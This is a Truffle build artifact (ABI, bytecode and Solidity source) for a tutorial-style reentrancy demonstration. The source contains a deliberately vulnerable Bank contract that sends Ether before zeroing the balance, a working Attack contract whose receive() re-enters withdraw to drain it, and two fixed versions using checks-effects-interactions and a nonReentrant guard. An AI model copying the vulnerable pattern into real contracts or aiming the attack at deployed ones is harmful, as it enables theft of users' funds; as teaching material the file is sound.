{
  "contractName": "Bank",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561000f575f80fd5b506105178061001d5f395ff3fe60806040526004361061003e575f3560e01c806312065fe0146100425780633ccfd60b1461006c57806370a0823114610082578063d0e30db0146100be575b5f80fd5b34801561004d575f80fd5b506100566100c8565b60405161006391906102be565b60405180910390f35b348015610077575f80fd5b506100806100cf565b005b34801561008d575f80fd5b506100a860048036038101906100a39190610335565b61023e565b6040516100b591906102be565b60405180910390f35b6100c6610252565b005b5f47905090565b5f805f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205490505f8111610151576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610148906103ba565b60405180910390fd5b5f3373ffffffffffffffffffffffffffffffffffffffff168260405161017690610405565b5f6040518083038185875af1925050503d805f81146101b0576040519150601f19603f3d011682016040523d82523d5f602084013e6101b5565b606091505b50509050806101f9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101f090610463565b60405180910390fd5b5f805f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20819055505050565b5f602052805f5260405f205f915090505481565b345f803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825461029d91906104ae565b92505081905550565b5f819050919050565b6102b8816102a6565b82525050565b5f6020820190506102d15f8301846102af565b92915050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610304826102db565b9050919050565b610314816102fa565b811461031e575f80fd5b50565b5f8135905061032f8161030b565b92915050565b5f6020828403121561034a576103496102d7565b5b5f61035784828501610321565b91505092915050565b5f82825260208201905092915050565b7f496e73756666696369656e742062616c616e63650000000000000000000000005f82015250565b5f6103a4601483610360565b91506103af82610370565b602082019050919050565b5f6020820190508181035f8301526103d181610398565b9050919050565b5f81905092915050565b50565b5f6103f05f836103d8565b91506103fb826103e2565b5f82019050919050565b5f61040f826103e5565b9150819050919050565b7f4661696c656420746f2073656e642045746865720000000000000000000000005f82015250565b5f61044d601483610360565b915061045882610419565b602082019050919050565b5f6020820190508181035f83015261047a81610441565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6104b8826102a6565b91506104c3836102a6565b92508282019050808211156104db576104da610481565b5b9291505056fea26469706673582212200375cbed650e9c6bd3b906d1cef56f398ed7bec18307f5830bdd4636c68ec50c64736f6c63430008140033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\n// by 0xAA\r\npragma solidity ^0.8.4;\r\n\r\ncontract Bank {\r\n    mapping (address => uint256) public balanceOf;    // mapping\r\n\r\n    // ether\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    // msg.senderether\r\n    function withdraw() external {\r\n        // \r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n        //  ether !!! fallback/receive\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n        // \r\n        balanceOf[msg.sender] = 0;\r\n    }\r\n\r\n    // \r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    Bank public bank; // Bank\r\n\r\n    // Bank\r\n    constructor(Bank _bank) {\r\n        bank = _bank;\r\n    }\r\n    \r\n    // Bankwithdraw\r\n    receive() external payable {\r\n        if (address(bank).balance >= 1 ether) {\r\n            bank.withdraw();\r\n        }\r\n    }\r\n\r\n    //  msg.value  1 ether\r\n    function attack() external payable {\r\n        require(msg.value == 1 ether, \"Require 1 Ether to attack\");\r\n        bank.deposit{value: 1 ether}();\r\n        bank.withdraw();\r\n    }\r\n\r\n    // \r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\n//  --checks-effect-interaction\r\ncontract GoodBank {\r\n    mapping (address => uint256) public balanceOf;\r\n\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw() external {\r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n        // --checks-effect-interactionETH\r\n        // balanceOf[msg.sender]0\r\n        balanceOf[msg.sender] = 0;\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n    }\r\n\r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\n//   \r\ncontract ProtectedBank {\r\n    mapping (address => uint256) public balanceOf;\r\n    uint256 private _status; // \r\n\r\n    // \r\n    modifier nonReentrant() {\r\n        //  nonReentrant _status  0\r\n        require(_status == 0, \"ReentrancyGuard: reentrant call\");\r\n        //  nonReentrant \r\n        _status = 1;\r\n        _;\r\n        //  _status 0\r\n        _status = 0;\r\n    }\r\n\r\n\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    // \r\n    function withdraw() external nonReentrant{\r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n\r\n        balanceOf[msg.sender] = 0;\r\n    }\r\n\r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n",
  "sourcePath": "/home/ap/truffleProject1/contracts/bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.20+commit.a1b79de6.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-06-27T04:20:12.982Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}